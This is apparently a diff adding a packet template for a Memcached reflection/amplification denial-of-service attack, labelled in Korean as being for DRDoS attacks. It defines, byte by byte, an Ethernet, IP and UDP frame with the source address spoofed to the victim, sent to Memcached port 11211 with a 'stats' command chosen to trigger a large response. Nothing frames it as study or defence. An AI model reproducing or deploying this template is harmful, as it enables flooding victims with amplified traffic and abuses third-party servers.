@@ -1,0 +1,34 @@
+# Memcached Amplification Packet Template
+# L4 Memcached DRDoS 공격용
+
+# L2 :: Ethernet HEADER
+@DMAC:6  # dst MAC
+@SMAC:6  # src MAC
+08 00    # Type: IP
+
+# L3 :: IP Header
+45       # Version: 4, Header Length: 20
+00       # Differentiated Service Field: 0
+00 2f    # Total Length: 47
+KK GG    # Identification (Random)
+40 00    # Flags: Don't Fragment
+40       # Time To Live: 64
+11       # Protocol: UDP
+@IPCHK:2 # Header Checksum
+@SIP:4   # Source IP (Spoofed - Victim)
+@DIP:4   # Destination IP (Memcached Server)
+
+# L4 :: UDP Header
+GK GG    # Source Port (Random)
+2b cb    # Destination Port: 11211 (Memcached)
+00 1b    # UDP Length: 27
+@UDPCHK:2 # UDP Checksum
+
+# Memcached Protocol
+00 00    # Request ID
+00 00    # Sequence Number
+00 01    # Total datagrams
+00 00    # Reserved
+
+# Command: "stats\r\n" (triggers large response)
+73 74 61 74 73 0d 0a  # stats\r\n
